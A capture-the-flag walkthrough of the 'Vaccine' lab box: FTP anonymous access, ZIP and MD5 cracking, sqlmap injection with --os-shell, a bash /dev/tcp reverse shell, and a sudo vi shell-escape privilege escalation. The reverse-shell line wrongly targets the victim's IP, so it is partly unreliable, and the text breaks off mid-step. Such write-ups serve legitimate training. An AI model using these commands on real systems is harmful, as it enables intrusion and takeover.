# Writeup – Vaccine

## Attack Path
### 1. Nmap scan
   ```bash
   sudo nmap -sC -sV 10.129.95.174
   ```
  There are three ports open: 21 (FTP), 22 (SSH), 80 (HTTP).  

### 2. FTP login <br>
#### 2.1 Connect via FTP
```bash
ftp 10.129.95.174
```
#### 2.2 Enter provided credentials
username: anonymous
password: anon123

#### 2.3 Check directories
```bash
ftp > dir
```
#### 2.4 Download backup.zip file
```bash
ftp > get backup.zip
```
#### 2.5 Exit ftp
```bash
ftp > exit
```

### 3. Crack the password of backup.zip file <br>
#### 3.1 Unzip backup.zip file
```bash
unzip backup.zip
```
The file is password protected. So, it must be cracked. 
#### 3.2 Install John the Ripper
```bash
sudo apt install john
```
#### 3.3 Convert the ZIP into the hash using the zip2john module that comes within John the Ripper
```bash
zip2john backup.zip > hashes 
```
```bash
cat hashes
```
#### 3.4 Load the wordlist & perform bruteforce attack against the hash stored in file
```bash
john -wordlist=/usr/share/wordlists/rockyou.txt hashes
```
We can see the cracked password now: 741852963 
#### 3.5 Unzip backup.zip file and use the cracked password
```bash
unzip backup.zip
```
```bash
ls -la
```

## 4. Identify the hash type & crack it with the hashcat
```bash
hashid 2cb42f8734ea607eefed3b70af13bbd3
```
```bash
echo '2cb42f8734ea607eefed3b70af13bbd3' > hash
```
```bash
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```
Hashcat cracked the password: qwerty789

### 5. Start web browser and type to enumerate the port 80
- Enter 10.129.95.174:80 in the browser URL
- Enter the username and cracked password

### 6. SQL injecting the dashboard
#### 6.1 Install sqlmap
```bash
sudo apt install sqlmap
```
#### 6.2 Perform SQL injection
- Obtain PHPSESSID cookie value from Firefox cookie editor
- Run sqlmap
```bash
sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=j1uot4n07trl1k8b95mmthoqj1"
```
- Run sqlmap with --os-shell option to obtain shell
```bash
sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=j1uot4n07trl1k8b95mmthoqj1" --os-shell
```
- Stabilize the shell
```bash
bash -c "bash -i >& /dev/tcp/10.129.95.174/443 0>&1"
```
- Turn on netcat listener
```bash
sudo nc -lvnp 443
```
- Execute the payload
```bash
bash -c "bash -i >& /dev/tcp/10.129.95.174/443 0>&1"
```
- By checking the listener, the shell has been activated. Make it fully interactive
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```
- User flag can be found in var/lib/postgresql/

### 7 Privilege escalation
- Now we are user postgres but sudo privileges can't be checked. Try to find the password in /var/www/html
- In the dashboard.php, the following has been found:
session_start();
if($_SESSION['login'] !== "true") {
  header("Location: index.php");
  die();
}
try {
  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres 
password=P@s5w0rd!");
}
- The password is: P@s5w0rd!
- Perform the following
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
- Press the button : button to set the instructions inside Vi::set shell=/bin/sh
- Type :shell
- 
